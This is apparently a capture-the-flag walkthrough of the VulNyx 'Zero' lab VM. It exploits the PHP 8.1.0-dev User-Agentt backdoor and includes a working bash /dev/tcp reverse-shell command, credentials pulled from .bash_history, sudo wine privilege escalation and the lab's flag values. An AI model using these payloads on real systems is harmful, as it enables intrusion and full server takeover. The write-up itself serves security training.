# ZERO - VulNyx

## Information
**Zero** is vulnerable Linux virtual machine of low difficutly from the VulNyx platform, created by user `d4t4s3c` and works correctly on VirtualBox and VMwawre hypervisors.

## Solution
### Enumeration
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -n -Pn -sS -p- --min-rate 5000 192.168.100.159           
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-27 03:40 EST
Nmap scan report for 192.168.100.159
Host is up (0.00071s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
MAC Address: 08:00:27:09:C6:A5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 87.43 seconds
```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sVC -p22,80,8080 192.168.100.159                  
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-27 03:46 EST
Nmap scan report for zero.lan (192.168.100.159)
Host is up (0.0013s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
8080/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 08:00:27:09:C6:A5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.07 seconds
```

### Shell (root)
#### 80/TCP (HTTP)
**Site**
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -v 192.168.100.159
*   Trying 192.168.100.159:80...
* Connected to 192.168.100.159 (192.168.100.159) port 80
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 192.168.100.159
> User-Agent: curl/8.15.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Fri, 27 Feb 2026 15:33:58 GMT
< Server: Apache/2.4.56 (Debian)
< Content-Length: 18
< Content-Type: text/html; charset=UTF-8
< 
<h1>Zerodium</h1>
* Connection #0 to host 192.168.100.159 left intact
```
**Directory Brute Force**
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://192.168.100.159
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.159
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 280]
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
```

#### 8080/TCP (HTTP)
**Site**
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -v 192.168.100.159:8080
*   Trying 192.168.100.159:8080...
* Connected to 192.168.100.159 (192.168.100.159) port 8080
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 192.168.100.159:8080
> User-Agent: curl/8.15.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Host: 192.168.100.159:8080
< Date: Fri, 27 Feb 2026 15:41:23 GMT
< Connection: close
< X-Powered-By: PHP/8.1.0-dev
< Content-type: text/html; charset=UTF-8
< 
<h1>Zerodium</h1>
* shutting down connection #0
```
**PHP/8.1.0-dev**
We find the PHP version in the headers `PHP/8.1.0-dev`.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -I "http://192.168.100.159:8080"
HTTP/1.1 200 OK
Host: 192.168.100.159:8080
Date: Fri, 27 Feb 2026 23:36:57 GMT
Connection: close
X-Powered-By: PHP/8.1.0-dev
Content-type: text/html; charset=UTF-8
```
We found the following [article](https://flast101.github.io/php-8.1.0-dev-backdoor-rce/) and saw that this verion has a **backdoor** installed. In March 2021, PHP's Github repo was compromised and **malicous code** was added. 

**Vulnerability**: If a special HTTP header is sent, any code can be executed on the server.

**CVE**: This vulnerability is very popular - Remote Code Execute (RCE).

We tested the exploit to see if it worked  and it seemed to work.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -H "User-Agentt: zerodiumsystem('"whoami"');" 'http://192.168.100.159:8080'
root
<h1>Zerodium</h1>
```

#### Reverse Shell
After reviewing the exploitation method, we found the following [exploit](https://www.exploit-db.com/exploits/49933), and it can be seen that if you pass header `"User-Agentt: zerodiumsystem('" + cmd + "');"` the server will then interpret the command you pass in the cmd argument.

Now, we are trying to get a reverse shell. We open a listener on port 443 in local machine.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 443
listening on [any] 443 ...
```
And with this command we can get a `root` shell directly from the web.

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -H "User-Agentt: zerodiumsystem(\"bash -c 'bash -i >& /dev/tcp/192.168.100.173/443 0>&1'\");" '192.168.100.159:8080'
```
So this is the result:
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.100.173] from (UNKNOWN) [192.168.100.159] 45744
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@6ad9beefaa2d:/var/www/html# id ; hostname
id ; hostname
uid=0(root) gid=0(root) groups=0(root)
6ad9beefaa2d
root@6ad9beefaa2d:/var/www/html# 
```
The `hostname` and file `.dockerenv` in the system root directory (`/`) indicates that we are inside a Docker container.
```bash
root@6ad9beefaa2d:/var/www/html# cd /
cd /
root@6ad9beefaa2d:/# ls -la
ls -la
total 84
drwxr-xr-x   1 root root 4096 May  5  2023 .
drwxr-xr-x   1 root root 4096 May  5  2023 ..
-rwxr-xr-x   1 root root    0 May  5  2023 .dockerenv
...
```
In the `./bash_history` file of home directory (`~`), we found the login information for the user `liam`. The `.bash_history` file contains the history of **Bash** command executed by the `root` user.
```bash
root@6ad9beefaa2d:/# cd ~
cd ~
root@6ad9beefaa2d:~# ls -la
ls -la
total 24
drwx------ 1 root root 4096 May  5  2023 .
drwxr-xr-x 1 root root 4096 May  5  2023 ..
-rw-r--r-- 1 root root  137 Feb 27 15:30 .bash_history
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x 3 root root 4096 May  5  2023 .local
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
root@6ad9beefaa2d:~# cat .bash_history
cat .bash_history
sshpass -p 'L14mD0ck3Rp0w4' ssh liam@127.0.0.1
```
This displayed content indicates that this is a command using the `sshpass` tool to log in via SSH wihout manually entering the password. `-p 'L14mD0ck3Rp0w4'` specifies the password. `ssh liam@127.0.0.1` means attempting to log in to the `liam` user on a server.

### Shell (liam)
#### 22/TCP (SSH)
We accessed the system as the user `liam` with the login credentials we obtained.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ ssh liam@192.168.100.159
liam@192.168.100.159's password: 
Linux zero 5.10.0-22-amd64 #1 SMP Debian 5.10.178-3 (2023-04-22) x86_64
Last login: Fri Feb 27 15:59:25 2026 from 192.168.100.173
liam@zero:~$ id ; hostname
uid=1000(liam) gid=1000(liam) grupos=1000(liam)
zero
liam@zero:~$ 
```
### Privilege Escalation
#### Enumeration
**Sudo**: `liam` users can run the `wine` (an emulator that runs Windows application on Linux) binary file as `root` using `sudo`. 

```bash
liam@zero:~$ sudo -l
Matching Defaults entries for liam on zero:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User liam may run the following commands on zero:
    (root) NOPASSWD: /usr/bin/wine
```
Because `wine` is capable of executing Windows programs, this means that `liam` can run commands or programs with `root` privileges through `wine`.

#### Abuse
We ran `wine`, called `cmd.exe` and became the `root` user.
```bash
liam@zero:~$ sudo -u root /usr/bin/wine cmd.exe
it looks like wine32 is missing, you should install it.
multiarch needs to be enabled first.  as root, please
execute "dpkg --add-architecture i386 && apt-get update &&
apt-get install wine32"
Microsoft Windows 6.1.7601

Z:\home\liam>echo %USERNAME% & hostname
root 
ZERO
```
#### Flags
As the `root` user, we can read the flags in `user.txt` and `root.txt`.
```bash
Z:\home\liam>type Z:\home\liam\user.txt
fa2cda1dfeef0af189e4f1b6e3dd99b5

Z:\home\liam>type Z:\root\root.txt
e9100b368f0025971ecc987c0a3b2c8b
```

***You are welcome!***
